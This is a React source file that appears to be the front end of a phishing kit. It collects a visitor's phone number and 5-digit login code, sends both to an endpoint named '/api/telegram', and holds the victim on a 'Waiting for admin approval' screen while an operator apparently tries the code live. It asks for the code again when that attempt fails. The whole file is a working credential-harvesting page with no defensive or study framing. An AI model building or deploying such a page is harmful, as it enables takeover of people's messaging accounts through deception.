
import React, { useEffect, useState } from "react";

function randomSessionId() {
  try {
    // @ts-ignore
    if (crypto && "randomUUID" in crypto) return crypto.randomUUID();
  } catch {}
  return Math.random().toString(36).slice(2) + Date.now().toString(36);
}

export default function App() {
  const [sessionId] = useState<string>(() => {
    try {
      const ex = localStorage.getItem("sessionId");
      if (ex) return ex;
      const sid = randomSessionId();
      localStorage.setItem("sessionId", sid);
      return sid;
    } catch {
      return randomSessionId();
    }
  });

  const [step, setStep] = useState<"phone" | "code" | "done">("phone");
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [waiting, setWaiting] = useState(false);
  const [errorText, setErrorText] = useState<string | null>(null);

  async function send(kind: "phone" | "verification", value: string) {
    const res = await fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: kind, value, sessionId }),
    });
    return res.ok;
  }

  async function submitPhone(e: React.FormEvent) {
    e.preventDefault();
    setErrorText(null);
    const v = phone.trim();
    if (v.length < 3) {
      setErrorText("Enter a valid phone.");
      return;
    }
    const ok = await send("phone", v);
    if (ok) setStep("code");
    else setErrorText("Server error, try again.");
  }

  async function submitCode(e: React.FormEvent) {
    e.preventDefault();
    setErrorText(null);
    if (code.length !== 5) {
      setErrorText("Enter 5 digits.");
      return;
    }
    setWaiting(true);
    const ok = await send("verification", code);
    if (!ok) {
      setWaiting(false);
      setErrorText("Server error, try again.");
      return;
    }
    const poll = async () => {
      try {
        const r = await fetch(`/api/status?sessionId=${encodeURIComponent(sessionId)}`);
        const j = await r.json();
        if (j.status === "approved") {
          setWaiting(false);
          setStep("done");
        } else if (j.status === "rejected") {
          setWaiting(false);
          setErrorText("you entered wrong code , enter true code");
          setCode("");
        } else {
          setTimeout(poll, 2000);
        }
      } catch {
        setTimeout(poll, 3000);
      }
    };
    poll();
  }

  return (
    <div style={{ minHeight: "100vh", display: "grid", placeItems: "center", background: "#0b0e14", color: "white", padding: 24 }}>
      <div style={{ width: "100%", maxWidth: 420, background: "#131824", borderRadius: 16, padding: 24, boxShadow: "0 10px 30px rgba(0,0,0,0.35)" }}>
        {step === "phone" && (
          <form onSubmit={submitPhone}>
            <h1 style={{ fontSize: 22, marginBottom: 12 }}>Enter your phone</h1>
            <input
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              placeholder="e.g. 89890"
              style={{ width: "100%", padding: 12, borderRadius: 10, border: "1px solid #2b3245", background: "#0f1422", color: "white" }}
            />
            {errorText && <p style={{ color: "#ff6b6b", marginTop: 10 }}>{errorText}</p>}
            <button
              type="submit"
              style={{ marginTop: 14, width: "100%", padding: 12, borderRadius: 10, border: "none", background: "#e11d48", color: "white", fontWeight: 700 }}
            >
              Continue
            </button>
          </form>
        )}

        {step === "code" && (
          <form onSubmit={submitCode}>
            <h1 style={{ fontSize: 22, marginBottom: 12 }}>Enter 5-digit code</h1>
            <input
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\\D/g, "").slice(0, 5))}
              placeholder="#####"
              style={{ letterSpacing: 6, fontSize: 20, textAlign: "center", width: "100%", padding: 12, borderRadius: 10, border: "1px solid #2b3245", background: "#0f1422", color: "white" }}
            />
            {waiting && <p style={{ marginTop: 10 }}>Waiting for admin approval…</p>}
            {errorText && <p style={{ color: "#ff6b6b", marginTop: 10 }}>{errorText}</p>}
            <button
              type="submit"
              disabled={waiting || code.length !== 5}
              style={{ marginTop: 14, width: "100%", padding: 12, borderRadius: 10, border: "none", background: "#e11d48", color: "white", fontWeight: 700, opacity: waiting || code.length !== 5 ? .6 : 1 }}
            >
              Submit Code
            </button>
          </form>
        )}

        {step === "done" && (
          <div>
            <h1 style={{ fontSize: 28, marginBottom: 8 }}>Done!</h1>
            <p>Thank you.</p>
          </div>
        )}
      </div>
    </div>
  );
}
